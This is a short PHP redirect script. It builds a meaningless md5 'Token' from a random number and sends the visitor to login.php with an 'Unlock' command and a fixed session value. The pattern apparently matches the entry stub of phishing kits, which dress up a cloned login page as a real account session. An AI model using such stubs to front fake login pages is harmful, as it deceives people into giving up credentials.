<?php 
ob_start();
$rnd = rand(11111111,999999999999);
$base = md5($rnd);
header("location: login.php?cmd=Unlock&Token=$base&session=5246_sssf2");
?>